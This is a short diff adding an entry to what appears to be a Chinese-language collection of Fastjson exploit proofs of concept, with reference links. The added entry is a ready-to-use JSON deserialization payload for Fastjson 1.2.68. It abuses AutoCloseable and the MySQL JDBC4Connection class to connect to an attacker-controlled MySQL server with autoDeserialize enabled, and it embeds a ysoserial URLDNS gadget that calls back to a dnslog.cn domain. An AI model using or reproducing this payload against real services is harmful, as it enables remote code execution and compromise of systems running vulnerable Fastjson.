@@ -238,6 +238,11 @@ poc:
 
 ```
 
+#### 1.2.68 jdbc反序列化
+```json
+{"@type":"java.lang.AutoCloseable", "@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"172.20.64.40","portToConnectTo":3306,"url":"jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","databaseToConnectTo":"test","info":{"@type":"java.util.Properties","PORT":"3306","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","user":"yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn","PORT.1":"3306","HOST.1":"172.20.64.40","NUM_HOSTS":"1","HOST":"172.20.64.40","DBNAME":"test"}}
+```
+
 参考：
 - https://github.com/su18/fastjson-commons-io
 - [Fastjson 68 commons-io AutoCloseable](https://su18.org/post/fastjson-1.2.68/)
